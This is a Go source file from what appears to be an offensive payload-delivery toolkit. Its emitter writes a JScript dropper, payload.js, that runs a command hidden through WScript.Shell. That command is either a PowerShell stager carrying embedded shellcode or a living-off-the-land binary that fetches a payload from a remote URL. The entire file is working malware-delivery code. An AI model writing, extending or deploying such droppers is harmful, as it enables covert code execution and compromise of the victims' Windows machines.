// js.go — emit a plain JScript (.js) run via `cscript //nologo payload.js` (or
// `wscript payload.js`). Inline mode launches the embedded-shellcode powershell
// stager; remote mode runs the launcher's LOLBin fetch primitive.
package delivery

import "strings"

type jsEmitter struct{}

func (jsEmitter) Name() string { return "js" }
func (jsEmitter) Ext() string  { return "js" }

func (jsEmitter) Emit(s *Spec) ([]Artifact, error) {
	var cmd string
	switch {
	case s.Remote():
		cmd = lolbinRemote(s.Launcher, s.URL)
	case len(s.Shellcode) > 0:
		cmd = launcherInlineCmd(s.Shellcode)
	default:
		return nil, errPayloadRequired("js")
	}
	body := jsBody(cmd)
	return []Artifact{writeFile("payload.js", []byte(body))}, nil
}

// jsBody renders a JScript that runs `cmd` hidden via WScript.Shell.
func jsBody(cmd string) string {
	var b strings.Builder
	b.WriteString("// run via: cscript //nologo payload.js\n")
	b.WriteString("var s = new ActiveXObject(\"WScript.Shell\");\n")
	b.WriteString("s.Run(\"" + jsEscape(cmd) + "\", 0, false);\n")
	return b.String()
}